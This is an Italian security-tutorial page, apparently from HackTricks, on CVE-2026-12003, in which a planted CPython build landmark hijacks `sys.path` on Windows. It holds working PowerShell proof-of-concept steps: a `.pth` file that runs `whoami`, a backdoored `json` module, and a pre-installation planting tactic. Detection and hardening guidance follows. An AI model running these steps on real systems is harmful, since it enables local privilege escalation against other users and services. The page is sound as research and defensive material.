# Windows CPython Build-Landmark e `sys.path` Hijacking

{{#include ../../../banners/hacktricks-training.md}}

Un runtime può conservare percorsi relativi destinati esclusivamente al proprio build tree. Se un runtime privilegiato installato risolve uno di questi percorsi in una directory scrivibile da un utente con privilegi inferiori, un attacker può piantare il **build landmark** previsto e fare in modo che il runtime consideri attendibile un prefisso di librerie alternativo. CVE-2026-12003 è un esempio relativo a Windows CPython: un file `Modules\Setup.local` piantato può reindirizzare l'elemento della standard library in `sys.path` senza modificare l'installazione Python protetta.<sup>[[1]](#references)[[2]](#references)</sup>

## Catena di costruzione dei percorsi di CPython

Le build Windows interessate erano compilate con `VPATH=..\..` ed esponevano questo valore come `sys._vpath`. Il fallback vulnerabile in `Modules/getpath.py` trattava `VPATH\Modules\Setup.local` come prova del fatto che l'interpreter fosse in esecuzione da un source tree; il seguente flusso di dati trasforma quel valore di build-time in una primitive di runtime per il search path.<sup>[[1]](#references)[[2]](#references)</sup>

| Fase | Valore derivato per `C:\Program Files\Python314\python.exe` |
| --- | --- |
| Percorso di build compilato | `VPATH=..\..` |
| Build landmark di runtime | `C:\Program Files\Python314\..\..\Modules\Setup.local` |
| Build landmark creato dall'attacker | `C:\Modules\Setup.local` |
| `build_prefix` selezionato | `C:\` |
| Standard library selezionata | `C:\Lib` |
| Risultato | `C:\Lib`, controllata dall'attacker, viene aggiunta a `sys.path` |

Il controllo è un fallback utilizzato quando il file `pybuilddir.txt`, presente accanto all'eseguibile, è assente o non leggibile. Questo è importante perché un utente con privilegi inferiori potrebbe non essere in grado di modificare `C:\Program Files\Python314`, ma potrebbe comunque essere in grado di creare nuove directory in `C:\`. Il successivo processo privilegiato `python.exe` carica codice Python utilizzando il proprio access token.<sup>[[1]](#references)[[2]](#references)</sup>

### Prerequisiti

Consideralo un confine di privilegio solo quando sono soddisfatte tutte le seguenti condizioni:<sup>[[1]](#references)[[2]](#references)</sup>

- Il target è una build **Windows CPython** interessata; la logica dei percorsi vulnerabile non è una proprietà del linguaggio Python.
- La directory ottenuta risolvendo `..\..` dalla directory contenente `python.exe` consente a un utente con privilegi inferiori di creare il landmark e l'albero `Lib`.
- Un utente con privilegi superiori, un service, un installer o un account di software deployment avvia successivamente quell'interpreter.
- Nessuna configurazione di path isolation sovrascrive il percorso di discovery vulnerabile.

## Enumeration

Esamina sia il valore compilato sia l'effettivo search path. Un valore esposto `..\..` è un'indicazione utile, ma non è una prova di exploitability: risolvi anche il percorso, verifica gli ACL e conferma che un landmark piantato si troverebbe al di fuori dell'installazione protetta.<sup>[[1]](#references)[[2]](#references)</sup>
```powershell
python -c "import os,sys; print(sys.executable); print(getattr(sys,'_vpath',None)); print(*sys.path, sep='\n')"

$pythonDir = python -c "import os,sys; print(os.path.dirname(sys.executable))"
$prefix = [IO.Path]::GetFullPath((Join-Path $pythonDir '..\..'))
$prefix
icacls $prefix
```
Non limitare la valutazione agli installer ufficiali. Per ogni prodotto che include `python.exe`, risolvi il relativo `sys._vpath` rispetto alla directory effettiva dell'eseguibile e verifica gli ACL nelle posizioni `Modules` e `Lib` risultanti. Un percorso di installazione più profondo potrebbe risolversi in una directory dell'applicazione o del vendor scrivibile diversa da `C:\`.<sup>[[1]](#references)</sup>

## Flusso di lavoro per lo sfruttamento nel lab

Il seguente PoC di lab riproduce una parte sufficiente del runtime legittimo al di sotto del prefisso selezionato affinché Python venga inizializzato, aggiunge una riga `.pth` eseguibile e infine crea il landmark. Crea il payload prima del landmark per evitare di lasciare temporaneamente l'interprete puntato a un albero di librerie incompleto.<sup>[[1]](#references)</sup>
```powershell
$pythonDir = python -c "import os,sys; print(os.path.dirname(sys.executable))"
$root = [IO.Path]::GetFullPath((Join-Path $pythonDir '..\..'))
robocopy /E "$pythonDir\Lib" "$root\Lib" | Out-Null
robocopy /E "$pythonDir\DLLs" "$root\Lib" | Out-Null
New-Item "$root\Lib\site-packages" -ItemType Directory -Force | Out-Null
'import subprocess;subprocess.run(["cmd.exe","/c","whoami > %TEMP%\\py-landmark.txt"],shell=False)' |
Set-Content "$root\Lib\site-packages\audit.pth" -Encoding Ascii
New-Item "$root\Modules" -ItemType Directory -Force | Out-Null
New-Item "$root\Modules\Setup.local" -ItemType File -Force | Out-Null
```
Durante la normale inizializzazione del sito, Python elabora i file `.pth` nelle directory site-packages riconosciute. Vengono eseguite solo le righe che iniziano con `import` seguito da uno spazio bianco, e l'istruzione eseguibile deve rimanere su una singola riga fisica; `python -S` impedisce l'importazione automatica di `site` e quindi questo trigger.<sup>[[1]](#references)[[4]](#references)</sup>

### Alternativa attivata dall'importazione

L'esecuzione all'avvio non è necessaria. Dopo aver riprodotto il tree di librerie legittimo, inserisci una backdoor in un modulo che uno script privilegiato importa prevedibilmente. Ad esempio, aggiungendo codice al file `Lib\json\__init__.py` impiantato, questo viene eseguito quando la vittima importa `json`; scegliere un modulo affidabile ma non importato universalmente può rendere il trigger meno rumoroso.<sup>[[1]](#references)</sup>
```powershell
'open(r"C:\Windows\Temp\json-import-token.txt","w").write(__import__("subprocess").check_output(["whoami"]).decode())' |
Add-Content "$root\Lib\json\__init__.py" -Encoding Ascii
```
Questa variante eredita comunque il token del processo che esegue l'importazione, ma dipende dal fatto che l'applicazione target importi il modulo modificato. Mantieni il comportamento originale del modulo durante i test su software reale, altrimenti l'importazione potrebbe fallire prima che il workflow privilegiato previsto venga completato.<sup>[[1]](#references)</sup>

## Pre-installation planting

Il Search-path planting può precedere l'installazione. Un utente con privilegi ridotti può preparare l'albero `Lib` futuro e `Modules\Setup.local`, quindi attendere che un portale software privilegiato, un workflow dell'help desk o un sistema di deployment esegua un'installazione per tutti gli utenti. Gli installer che avviano il nuovo interpreter per installare pacchetti o precompilare la standard library possono attivare il payload con l'account di deployment, senza che un amministratore debba aprire manualmente Python.<sup>[[1]](#references)</sup>

Questo modifica anche la revisione del deployment: controlla gli ancestor scrivibili e le directory landmark/library già esistenti **prima** di installare o aggiornare un runtime incluso, invece di verificare soltanto la directory di installazione finale dopo il deployment.<sup>[[1]](#references)</sup>

## Rilevamento e hardening

Pivot utili sull'host sono il landmark e l'albero delle library inattesi, seguiti da un avvio privilegiato di Python. Cerca `Modules\Setup.local`, directory `Lib\site-packages\*.pth` a livello root o comunque fuori posto, pacchetti della standard library copiati e file di modulo il cui proprietario o orario di creazione differisce da quello dell'installazione protetta. Metti in correlazione la loro creazione da parte di un utente standard con un `python.exe` con privilegi elevati che avvia `cmd.exe`, `powershell.exe`, strumenti di gestione degli account o altri processi figli insoliti.<sup>[[1]](#references)</sup>
```powershell
Get-Item C:\Modules\Setup.local -ErrorAction SilentlyContinue | Format-List FullName,CreationTime,LastWriteTime
Get-ChildItem C:\Lib\site-packages -Filter *.pth -ErrorAction SilentlyContinue |
Select-Object FullName,CreationTime,LastWriteTime
Get-ChildItem C:\Lib -Recurse -File -ErrorAction SilentlyContinue |
Get-Acl | Where-Object Owner -notmatch 'TrustedInstaller|Administrators|SYSTEM'
```
La correzione upstream rimuove il fallback `VPATH\Modules\Setup.local` e rende `pybuilddir.txt` l'unico indicatore dell'albero di build. Preferire una build fissa o un'installazione per-utente gestita con l'attuale Python install manager. Quando l'aggiornamento è temporaneamente impossibile, proteggere l'ancestor risolto e creare preventivamente `Modules` con ACL restrittive; anche i file `._pth` controllati o `PYTHONHOME` possono modificare il rilevamento, ma richiedono test di compatibilità dell'applicazione.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## References

- [1] [Bishop Fox - CVE-2026-12003: Hijacking dei percorsi di ricerca di CPython su Windows ed escalation locale dei privilegi](https://bishopfox.com/blog/python-software-foundation-python-3-11-0a3-to-3-15-0b2)
- [2] [CPython issue #151544 - I percorsi di ricerca in-tree possono essere abilitati senza modificare la directory di installazione](https://github.com/python/cpython/issues/151544)
- [3] [CPython pull request #151545 - Rimuove il fallback `VPATH/Modules/Setup.local`](https://github.com/python/cpython/pull/151545)
- [4] [Python documentation - File di configurazione dei percorsi `site`](https://docs.python.org/3/library/site.html)
{{#include ../../../banners/hacktricks-training.md}}
